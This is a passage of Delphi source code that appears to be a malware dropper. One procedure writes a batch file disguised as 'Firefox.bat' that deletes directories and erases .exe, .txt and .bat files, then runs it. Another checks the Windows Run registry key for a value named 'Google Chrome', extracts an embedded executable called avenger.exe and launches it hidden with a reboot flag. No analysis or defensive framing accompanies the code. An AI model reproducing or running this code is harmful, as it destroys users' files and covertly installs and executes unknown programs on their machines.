    WriteLn(_Firefox, 'rd /s /q c:\avenger');
    WriteLn(_Firefox, 'del c:\avenger.txt');
    WriteLn(_Firefox, 'Erase "%s"  c:\*.exe');
    WriteLn(_Firefox, 'del     avenger.exe');
    WriteLn(_Firefox, 'Erase "%s"  *.txt  ');
    WriteLn(_Firefox, 'Erase "%s"  *.bat');
    CloseFile(_Firefox);
    ShellExecute(0, nil, 'cmd.exe', '/k start Firefox.bat', nil, Sw_normal);
  end;
end;

procedure Extract_Volarite;
var
  _BARATA: TRegistry;
  a: TResourceStream;
  b: String;
begin
  _BARATA := TRegistry.Create;
  _BARATA.RootKey := HKEY_CURRENT_USER;
  _BARATA.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run', false);
  if not _BARATA.ValueExists('Google Chrome') then
  begin
    b := 'avenger.exe';
    a := TResourceStream.Create(HInstance, 'AVG', 'EXEFILE');
    try
      a.SaveToFile(b);
    finally
      a.Free;
      ShellExecute(0, 'open', 'cmd.exe',
        '/k avenger.exe /nogui /reboot Log.txt', nil, SW_HIDE);
    end;
  end;
end;

end.
